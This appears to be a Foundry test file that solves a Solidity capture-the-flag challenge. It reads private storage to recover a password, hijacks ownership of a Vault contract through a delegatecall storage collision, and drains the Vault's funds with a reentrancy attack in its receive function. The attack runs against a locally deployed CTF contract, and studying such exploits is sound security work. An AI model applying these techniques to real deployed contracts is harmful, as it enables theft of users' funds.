// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@src/HackCtf/Vault.sol";

// ... existing code ...
interface IVaultLogic {
    function changeOwner(bytes32 _password, address newOwner) external;
}

interface IVault {
    function owner() external view returns (address);
    function logic() external view returns (address);
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    address owner = address(1);
    address palyer = address(this);
    bool reenter = true;

    // Fallback function to receive Ether from the Vault and reenter `withdraw`
    /**
     * 接收资金
     */
    receive() external payable {
        if (reenter) {
            reenter = false;
            vault.withdraw(); // Reenter withdraw recursively
        }
    }

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 1 ether}();
        vm.stopPrank();
    }

    function callChangeOwner(Vault vault, bytes32 password, address newOwner) public {
        // Encode the function signature and arguments
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);

        // Call `Vault` with the encoded data, which will use the fallback to call `VaultLogic`
        (bool success,) = address(vault).call(data);
        require(success, "changeOwner call failed");
    }

    /**
     * 重入攻击
     */
    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        // 获取logic地址
        address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
        console.log("logicAddress", logicAddress);
        assertEq(logicAddress, address(logic));
        // 获取密码
        bytes32 password = vm.load(logicAddress, bytes32(uint256(1)));
        assertEq(password, "0x1234");

        // 调用changeOwner函数
        address owner = vault.owner();

        // 修改owner
        callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), palyer);
        assertEq(vault.owner(), palyer);

        // 打开提现
        vault.openWithdraw();
        assertEq(vault.canWithdraw(), true);

        // 还原owner
        callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), owner);
        vm.stopPrank();

        // 执行重入
        vault.deposite{value: 1 ether}();
        vault.withdraw();
        assertEq(address(vault).balance, 0);
        require(vault.isSolve(), "solved");
    }
}
